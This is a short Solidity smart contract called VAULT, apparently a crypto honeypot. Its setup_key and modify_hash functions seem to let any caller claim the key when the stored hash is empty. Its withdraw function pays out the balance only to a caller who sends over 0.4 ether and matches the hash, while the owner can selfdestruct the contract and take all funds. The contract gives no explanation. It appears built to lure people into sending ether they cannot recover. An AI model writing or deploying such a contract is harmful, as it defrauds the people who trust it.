pragma solidity ^0.4.25;
contract VAULT
{
bytes32 keyHash;
address owner;
bytes32 wallet_id = 0xe346313e6971755e249e10726c10717c735e9e54eb5ca3c4aff9ff9eb628150c;
constructor() public {
owner = msg.sender;
}
function withdraw(string key) public payable
{
require(msg.sender == tx.origin);
if(keyHash == keccak256(abi.encodePacked(key))) {
if(msg.value > 0.4 ether) {
msg.sender.transfer(address(this).balance);
}
}
}
function setup_key(string key) public
{
if (keyHash == 0x0) {
keyHash = keccak256(abi.encodePacked(key));
}
}
function modify_hash(bytes32 new_hash) public
{
if (keyHash == 0x0) {
keyHash = new_hash;
}
}
function clear() public
{
require(msg.sender == owner);
selfdestruct(owner);
}
function get_id() public view returns(bytes32){
return wallet_id;
}
function () public payable {
}
}